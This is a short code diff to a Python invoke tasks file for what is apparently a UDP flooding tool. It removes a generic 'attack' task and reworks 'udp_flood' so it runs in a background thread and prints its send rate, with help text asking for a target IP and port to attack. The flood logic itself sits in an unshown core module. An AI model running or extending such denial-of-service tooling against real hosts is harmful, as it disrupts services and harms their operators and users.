@@ -1,16 +1,18 @@
+from time import sleep
+
 from invoke import task
-
-from core import run, UDPFlooder, UDPChecker, TCPChecker, Address, AddressWithPortValidator
-
-
-@task(help={'address': "Please pass IP address to attack. i.e. 123.12.12.123"})
-def attack(c, address):
-    run(address)
+from threading import Thread
+from core import UDPFlooder, UDPChecker, TCPChecker, Address, AddressWithPortValidator
 
 
 @task(help={'address': "Please pass IP address with port to attack. i.e. 123.12.12.123:53"})
 def udp_flood(c, address):
-    UDPFlooder(address).run()
+    flooder = UDPFlooder(address)
+    flooder_thread = Thread(target=flooder.run, daemon=True)
+    flooder_thread.start()
+    while True:
+        sleep(5)
+        flooder.print_rate()
 
 
 @task(help={'address': "Please pass IP address or domain address with port. i.e. 123.12.12.123:53 or domain.com:443"})
